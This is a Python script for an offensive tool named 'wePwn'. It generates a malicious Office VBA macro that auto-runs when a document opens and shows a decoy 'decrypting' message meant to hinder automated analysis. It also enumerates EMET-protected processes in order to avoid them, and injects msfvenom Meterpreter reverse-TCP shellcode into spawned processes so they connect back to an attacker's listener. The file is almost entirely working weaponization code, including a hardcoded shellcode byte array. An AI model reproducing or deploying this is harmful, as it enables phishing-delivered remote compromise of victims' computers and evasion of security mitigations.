import os
import sys
import argparse
from termcolor import colored

# Generate MSF list stream for
# msfvenom -p windows/x64/meterpreter/reverse_tcp
# and
# msfvenom -p windows/meterpreter/reverse_tcp
#
# Let user define 	--x64 -> x64 payload  	Default: windows/x64/meterpreter/reverse_tcp
# 			--x86 -> x86 payload	Default: windows/meterpreter/reverse_tcp
# 			lhost -> LHOST		No Default
#			lport -> LPORT		Default: 443
#			
#			--out -> OUTPUT file	Default: wepwn.txt
#
# You can modify binary-paths.txt to have a list of your own choice :)
#
 
def printBanner():
	print colored("              __________", "red")                
	print colored("__  _  __ ____\______   \__  _  ______", "red")  
	print colored("\ \/ \/ // __ \|     ___/\ \/ \/ /    \ ", "red")
	print colored(" \     /\  ___/|    |     \     /   |  \\", "red")
	print colored(" \/\_/  \___  >____|      \/\_/|___|  /", "red")
	print colored("            \/                      \/ ", "red")
	print colored("[*] Version 0.1 BETA", "blue")

def validateIP(ipaddr):
	vals=ipaddr.split(".")
	if len(vals) != 4:
		return False
	else:
		# At least we have 4 dots yeah
		for i in vals:
			try:
				val = int(i)
				if not(val >= 0 and val <= 255):
					return False
			except:
				return False
		return True

def validatePort(port):
	try:
		val = int(port)
		if not(val >= 0 and val <= 65535):
			return False
	except:
		return False
	return True

def validate64bitpayload(payload):
	f = open("payload-list.txt", "r")
	text = f.read().split("\n")
	for i in text:
		if (payload in text) and ("x64" in payload):
			return True
	return False

def validate32bitpayload(payload):
	f = open("payload-list.txt", "r")
	text = f.read().split("\n")
	for i in text:
		if (payload in text) and not ("x64" in payload):
			return True
		return False

def generateWPM(payload):
	a = "232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193,,207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,,0,104,119,115,50,95,84,104,76,119,38,7,255,213,184,144,1,0,0,41,,196,84,80,104,41,128,107,0,255,213,106,5,104,192,168,179,128,104,2,0,,1,187,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,,232,97,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213,131,248,,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,,34,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,,110,77,97,255,213,94,94,255,12,36,233,113,255,255,255,1,195,41,198,117,,199,195,187,240,181,162,86,106,0,83,255,213"
	a = a.split(",")

	pos = 0
	for i in a:
		print "rekt = WriteProcessMemory(hProcess, ByVal lLinkToLibrary + %s, %s, 1, b)" % (str(pos),str(i))
		pos += 1

printBanner()

print ""

parser = argparse.ArgumentParser(description="wePwn")
parser.add_argument("--x64", dest="x64", default="windows/x64/meterpreter/reverse_tcp", help="msfvenom x64 payload")
parser.add_argument("--x86", dest="x86", default="windows/meterpreter/reverse_tcp", help="msfvenom x86 payload")
parser.add_argument("lhost64", help="LHOST for x64 to connect/bind to")
parser.add_argument("lhost86", help="LHOST for x86 to connect/bind to")
parser.add_argument("lport64", help="LPORT for x64 to connect/bind to")
parser.add_argument("lport86", help="LPORT for x86 to connect/bind to")
parser.add_argument("--out", default="wepwn.txt", help="File to output the VBA macro to")
parser.add_argument("--msgbox", default=True, dest="msgbox", help="Present messagebox to prevent automated analysis")
parser.add_argument("--msg", default="This document will begin decrypting, please allow up to 5 minutes", dest="msg", 
help="The message to present the victim")

if len(sys.argv) <= 2:
	parser.print_help()
	print ""

args = parser.parse_args()

xlhost = False
xlport = False
x32bit = False
x64bit = False

if validateIP(args.lhost64):
	print colored("[+] LHOST X64: %s" % args.lhost64, "green")
	xlhost = True
else:
	print colored("[-] Incorrect LHOST X64: %s" % args.lhost64, "red")

if validateIP(args.lhost86):
        print colored("[+] LHOST X86: %s" % args.lhost86, "green")
        xlhost = True
else:
        print colored("[-] Incorrect LHOST X86: %s" % args.lhost86, "red")

if validatePort(args.lport64):
	print colored("[+] LPORT X64: %s" % args.lport64, "green")
	xlport = True
else:
	print colored("[-] Incorrect LPORT X64: %s" %args.lport64, "red")

if validatePort(args.lport86):
        print colored("[+] LPORT X86: %s" % args.lport86, "green")
        xlport = True
else:
        print colored("[-] Incorrect LPORT X86: %s" %args.lport86, "red")

if validate32bitpayload(args.x86):
	print colored("[+] X86 PAYLOAD: %s" % args.x86, "green")
	x32bit = True
else:
	print colored("[-] Incorrect X86 PAYLOAD: %s" % args.x86, "red")

if validate64bitpayload(args.x64):
	print colored("[+] X64 PAYLOAD: %s" % args.x64, "green")
	x64bit = True
else:
	print colored("[-] Incorrect X86 PAYLOAD: %s" % args.x64, "red")

# At this point we know that we have the correct LHOST and LPORT ready for smexiness
# We also validated our parameters to all be correct

if (not xlhost) or (not xlport) or (not x32bit) or (not x64bit):
	sys.exit("Invalid parameters, quitting")
	# Invalid, do not continue
print ""

print colored("[*] Welcome to wePWN", "blue")

print ""
print colored("[+] Obtaining payloads", "green")
print colored("\t X86 PAYLOAD", "green")
pay86 = os.popen("msfvenom -p %s LHOST=%s LPORT=%s -f num" % (args.x86, args.lhost86, args.lport86)).read()
print colored("\t X64 PAYLOAD", "green")
pay64 = os.popen("msfvenom -p %s LHOST=%s LPORT=%s -f num" % (args.x64, args.lhost64, args.lport64)).read()
print colored("[+] Payloads obtained successfully", "green")
print colored("[+] Formatting payloads", "green")
pay86 = pay86.replace("\r\n", "").split(", ")
pay64 = pay64.replace("\r\n", "").split(", ")
print colored("[+] Formatting complete", "green")

lines1 = ["Private Const PROCESS_ALL_ACCESS = &H1F0FFF\r\n",
"Private Const MEM_COMMIT = &H1000\r\n",
"Private Const MEM_RELEASE = &H8000\r\n",
"Private Const PAGE_READWRITE = &H40\r\n",
"Private Const HKEY_LOCAL_MACHINE = &H80000002\r\n",
"Private Const PROCESSOR_ARCHITECTURE_AMD64 = 9\r\n",
"#If VBA7 Then 'x64 office\r\n",
"Private Declare PtrSafe Function VirtualAllocEx Lib \"kernel32\" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long\r\n",
"Private Declare PtrSafe Function VirtualFreeEx Lib \"kernel32\" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long\r\n",
"Private Declare PtrSafe Function OpenProcess Lib \"kernel32\" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long\r\n",
"Private Declare PtrSafe Function WriteProcessMemory Lib \"kernel32\" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long\r\n",
"Private Declare PtrSafe Function CreateRemoteThread Lib \"kernel32\" (ByVal hProcess As Long, lpThreadAttributes As Any, ByVal dwStackSize As Long, lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long\r\n",
"Private Declare PtrSafe Sub GetSystemInfo Lib \"kernel32\" (lpSystemInfo As SYSTEM_INFO)\r\n",
"Private Declare PtrSafe Function GetCurrentProcess Lib \"kernel32\" () As LongPtr\r\n",
"Private Declare PtrSafe Function IsWow64Process Lib \"kernel32\" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean\r\n",
"Type SYSTEM_INFO\r\n",
"wProcessorArchitecture As Integer\r\n",
"wReserved As Integer\r\n",
"dwPageSize As Long\r\n",
"lpMinimumApplicationAddress As LongPtr\r\n",
"lpMaximumApplicationAddress As LongPtr\r\n",
"dwActiveProcessorMask As LongPtr\r\n",
"dwNumberOrfProcessors As Long\r\n",
"dwProcessorType As Long\r\n",
"dwAllocationGranularity As Long\r\n",
"wProcessorLevel As Integer\r\n",
"wProcessorRevision As Integer\r\n",
"End Type\r\n",
"#Else\r\n",
"Private Declare Function VirtualAllocEx Lib \"kernel32\" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long\r\n",
"Private Declare Function VirtualFreeEx Lib \"kernel32\" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long\r\n",
"Private Declare Function OpenProcess Lib \"kernel32\" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long\r\n",
"Private Declare Function WriteProcessMemory Lib \"kernel32\" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long\r\n",
"Private Declare Function CreateRemoteThread Lib \"kernel32\" (ByVal hProcess As Long, lpThreadAttributes As Any, ByVal dwStackSize As Long, lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long\r\n",
"Private Declare Sub GetSystemInfo Lib \"kernel32\" (lpSystemInfo As SYSTEM_INFO)\r\n",
"Private Declare Function GetCurrentProcess Lib \"kernel32\" () As Long\r\n",
"Private Declare Function IsWow64Process Lib \"kernel32\" (ByVal hProcess As Long, ByRef Wow64Process As Boolean) As Boolean\r\n",
"Type SYSTEM_INFO\r\n",
"wProcessorArchitecture As Integer\r\n",
"wReserved As Integer\r\n",
"dwPageSize As Long\r\n",
"lpMinimumApplicationAddress As Long\r\n",
"lpMaximumApplicationAddress As Long\r\n",
"dwActiveProcessorMask As Long\r\n",
"dwNumberOrfProcessors As Long\r\n",
"dwProcessorType As Long\r\n",
"dwAllocationGranularity As Long\r\n",
"dwReserved As Long\r\n",
"End Type\r\n",
"#End If\r\n",
"Public Function IsOffice64Bit() As Boolean\r\n",
"Dim lpSystemInfo As SYSTEM_INFO\r\n",
"Call GetSystemInfo(lpSystemInfo)\r\n",
"If lpSystemInfo.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64 Then\r\n",
"Call IsWow64Process(GetCurrentProcess(), IsOffice64Bit)\r\n",
"IsOffice64Bit = Not IsOffice64Bit\r\n",
"End If\r\n",
"End Function\r\n",
"Public Function IsWow64(handle As Long) As Boolean\r\n",
"Call IsWow64Process(handle, meh)\r\n",
"IsWow64 = Not meh\r\n",
"End Function\r\n",
"Public Function DieTotal()\r\n"]

# Add MsgBox text
if args.msgbox == True:
	lines1 += [("MsgBox \"%s\"\r\n" % args.msg)]

lines1 += ["End Function\r\n",
"Public Function getList() As String()\r\n",
"Dim myList As String\r\n",
"myList = \"\"\r\n"]

# Add List of Binary Paths

f = open('binary-paths.txt', 'r')

binPaths = f.readlines()

for p in binPaths:
	q = p.replace("\n", "")
	lines1 += [("myList = myList & \"%s\" & \",\"\r\n" % q)]

f.close()

lines1 += ["myArray = Split(myList, \",\")\r\n",
"Dim c As Integer\r\n",
"Dim list() As String\r\n",
"For c = LBound(myArray) To (UBound(myArray) - 1)\r\n",
"ReDim Preserve list(c)\r\n",
"list(c) = myArray(c)\r\n",
"Next\r\n",
"getList = list\r\n",
"End Function\r\n",

# HERE
"Public Function getEMET() As String()\r\n",
"Set objShell = CreateObject(\"WScript.Shell\")\r\n",
"Set oReg = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\" & \".\" & \"\\root\\default:StdRegProv\")\r\n",
"oReg.EnumKey HKEY_LOCAL_MACHINE, \"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\", arrSubKeys\r\n",
"Dim sArray() As String\r\n",
"Dim Index As Integer\r\n",
"Index = 0\r\n",
"For Each strSubKey In arrSubKeys\r\n",
"oReg.GetQWORDValue HKEY_LOCAL_MACHINE, \"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\" & strSubKey & \"\\\", \"MitigationOptions\", dwValue\r\n",
"If dwValue Then\r\n",
"ReDim Preserve sArray(Index)\r\n",
"sArray(Index) = LCase(strSubKey)\r\n",
"Index = Index + 1\r\n",
"End If\r\n",
"Next\r\n",
"getEMET = sArray\r\n",
"End Function\r\n",
# TO HERE
"Public Function AutoPwn() As Long\r\n",
"myArray = FightEMET\r\n",
"Dim Count As Integer\r\n",
"Dim Success As Integer\r\n",
"For Count = LBound(myArray) To UBound(myArray)\r\n",
"Dim proc As String\r\n",
"proc = myArray(Count)\r\n",
"Success = Inject(proc)\r\n",
"If Success = 1 Then Exit For\r\n",
"Next\r\n",
"End Function\r\n",
"Public Function FightEMET() As String()\r\n",
"myArray = getList\r\n",
"smex = getEMET\r\n",
"Dim Count As Integer\r\n",
"Dim sCount As Integer\r\n",
"Dim kCount As Integer\r\n",
"kCount = 0\r\n",
"Dim killedEMET() As String\r\n",
"For Count = LBound(myArray) To UBound(myArray)\r\n",
"progStr = myArray(Count)\r\n",
"Dim superStr As String\r\n",
"Dim isBad As Boolean\r\n",
"isBad = False\r\n",
"If progStr <> \"\" Then\r\n",
"Prog = Split(progStr, \" \")\r\n",
"If UBound(Prog) >= 0 Then superStr = LCase(Prog(0))\r\n",
"For sCount = LBound(smex) To UBound(smex)\r\n",
"If superStr Like (\"*\" & smex(sCount)) Then\r\n",
"isBad = True\r\n",
"End If\r\n",
"Next    \r\n",
"If isBad = False Then\r\n",
"ReDim Preserve killedEMET(kCount)\r\n",
"killedEMET(kCount) = progStr\r\n",
"kCount = kCount + 1\r\n",
"End If\r\n",
"End If\r\n",
"Next\r\n",
"FightEMET = killedEMET\r\n",
"End Function\r\n",
"Public Function Inject(processCmd As String) As Long\r\n",
"Dim hProcess&, hThread&, lLinkToLibrary&, lSize&, hKernel&\r\n",
"If IsOffice64Bit Then\r\n",
"On Error Resume Next\r\n",
"A = Shell(processCmd, 0)\r\n",
"hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, A)\r\n",
"Dim b64 As Boolean\r\n",
"b64 = False\r\n",
"b64 = IsWow64(hProcess)\r\n",
"If b64 = True Then\r\n",
"If hProcess = 0 Then\r\n",
"Exit Function\r\n",
"End If\r\n",
"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, 1024, &H3000, PAGE_READWRITE)\r\n",
"If lLinkToLibrary = 0 Then\r\n",
"Exit Function\r\n",
"End If      \r\n",
"Position = lLinkToLibrary\r\n"]

# Insert 64 bit payload into position
pos = 0
for i in pay64:
     	lines1 += ["rekt = WriteProcessMemory(hProcess, ByVal lLinkToLibrary + %s, %s, 1, b)\r\n" % (str(pos),str(int(i,16)))]
     	pos += 1

lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)\r\n",
"If hThread = 0 Then\r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Exit Function\r\n",
"End If\r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Inject = 1 'Success\r\n",
"Else\r\n",
"If hProcess = 0 Then\r\n",
"Exit Function\r\n",
"End If\r\n",
"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, 1024, &H3000, PAGE_READWRITE)\r\n",
"If lLinkToLibrary = 0 Then\r\n",
"Exit Function\r\n",
"End If\r\n",
"Position = lLinkToLibrary\r\n"]

# Insert 32 bit payload into position

pos = 0
for i in pay86:
        lines1 += ["rekt = WriteProcessMemory(hProcess, ByVal lLinkToLibrary + %s, %s, 1, b)\r\n" % (str(pos),str(int(i,16)))]
        pos += 1

lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)\r\n",
"If hThread = 0 Then\r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Exit Function\r\n",
"End If    \r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Inject = 1 'Success\r\n",
"End If\r\n",
"Else\r\n",
"A = Shell(processCmd, 0)\r\n",
"hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, A)\r\n",
"If hProcess = 0 Then\r\n",
"Exit Function\r\n",
"End If\r\n",
"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, 1024, &H3000, PAGE_READWRITE)\r\n",
"If lLinkToLibrary = 0 Then\r\n",
"Exit Function\r\n",
"End If         \r\n",
"Position = lLinkToLibrary\r\n"]

# Insert 32 bit payload into position

pos = 0
for i in pay86:
        lines1 += ["rekt = WriteProcessMemory(hProcess, ByVal lLinkToLibrary + %s, %s, 1, b)\r\n" % (str(pos),str(int(i,16)))]
        pos += 1

lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)\r\n",
"If hThread = 0 Then\r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Exit Function\r\n",
"End If\r\n",
"If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE\r\n",
"Inject = 1\r\n",
"End If\r\n",
"End Function\r\n",
"Sub AutoOpen()\r\n",
"DieTotal\r\n",
"AutoPwn\r\n",
"End Sub\r\n",
"Sub Workbook_Open()\r\n",
"DieTotal\r\n",
"AutoPwn\r\n",
"End Sub\r\n"]

# Open and write to text file

print colored("[+] Begin writing payload to: %s" % args.out, "green")

f = open(args.out, 'w+')

f.writelines(lines1)

f.close()

print colored("[+] Payload written","green")

print ""

print colored("[*] Please start up your x64 listener on %s:%s" % (args.lhost64,args.lport64), "blue")
print colored("[*] Please start up your x86 listener on %s:%s" % (args.lhost86,args.lport86), "blue")

print ""
